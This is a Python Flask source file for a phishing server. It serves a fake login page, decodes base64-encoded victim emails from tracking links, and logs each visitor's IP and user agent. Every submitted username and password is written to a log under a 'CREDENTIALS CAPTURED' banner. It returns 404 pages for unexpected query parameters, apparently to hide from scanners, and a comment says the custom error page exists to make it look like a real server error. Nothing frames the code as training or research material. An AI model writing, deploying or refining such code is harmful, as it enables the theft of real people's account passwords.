from flask import Flask, render_template, request, abort
import datetime
import base64

app = Flask(__name__)

ALLOWED_PARAMS = {'u', 'p', 'logo', 'bg', 'edificio', 'planta'}

@app.route('/email', methods=['POST'])
def log_email():
    """Handle email submission from step 1"""
    email = request.form.get('email')
    if email:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent')
        
        with open("./static/log.txt", "a") as f:
            f.write(f"--- Email Entered [{timestamp}] ---\n")
            f.write(f"Email: {email}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"User-Agent: {ua}\n")
            f.write("- " * 10 + "\n")
        return "Success", 200
    return "Missing Email", 400

@app.route('/', methods=['GET', 'POST'])
def login():
    # 1. Handle GET (Initial Page Load)
    if request.method == 'GET':
        received_params = set(request.args.keys())
        if not received_params.issubset(ALLOWED_PARAMS):
            abort(404) 

        # Log the visit
        account_param = request.args.get('u')
        captured_email = "Unknown"
        if account_param:
            try:
                captured_email = base64.b64decode(account_param).decode('utf-8')
            except Exception:
                pass # Fallback to unknown or raw param

        # Get edificio and planta parameters
        edificio = request.args.get('edificio', 'N/A')
        planta = request.args.get('planta', 'N/A')

        with open("./static/log.txt", "a") as f:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"--- Visit: {captured_email} at {timestamp} ---\n")
            f.write(f"Edificio: {edificio} | Planta: {planta}\n")

        return render_template('login.html')

    # 2. Handle POST (Password Submission)
    if request.method == 'POST':
        # request.form behaves like a dict for POST data
        username = request.form.get('u')
        password = request.form.get('p')

        if username and password:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open("./static/log.txt", "a") as f:
                f.write(f"!!! CREDENTIALS CAPTURED [{timestamp}] !!!\n")
                f.write(f"User: {username}\n")
                f.write(f"Pass: {password}\n")
                f.write("=" * 30 + "\n")
            return "Success", 200
        
        return "Missing Data", 400
    
    received_params = set(request.args.keys())
    if not received_params.issubset(ALLOWED_PARAMS):
        abort(404) 

    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # CLICKS logic
    account_param = request.args.get('u') or request.args.get('u')
    captured_email = "Unknown"

    if account_param:
        try:
            captured_email = base64.b64decode(account_param).decode('utf-8')
        except Exception:
            abort(404) 

    with open("./static/log.txt", "a") as f:
        f.write("=" * 30 + "\n")
        f.write(f" Visit detected at: [{timestamp}]\n")
        f.write(f"User: {captured_email}\n")
        f.write(f"IP: {ip}\n")
        f.write(f"User-Agent: {ua}\n")
        f.write("- " * 10 + "\n")

    # CREDENTIAL CAPTURE logic
    username = request.args.get('u')
    password = request.args.get('p')
    
    if username and password:
        with open("./static/log.txt", "a") as f:
            f.write(f"!!! CREDENTIALS CAPTURED [{timestamp}] !!!\n")
            f.write(f"User: {username}\n")
            f.write(f"Pass: {password}\n")
            f.write("=" * 30 + "\n")
        return "Success", 200 

    return render_template('login.html')

# Custom 404 handler to make it look like a real server error
@app.errorhandler(404)
def page_not_found(e):
    return "<h1>404 Not Found</h1><p>The requested URL was not found on the server.</p>", 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8081)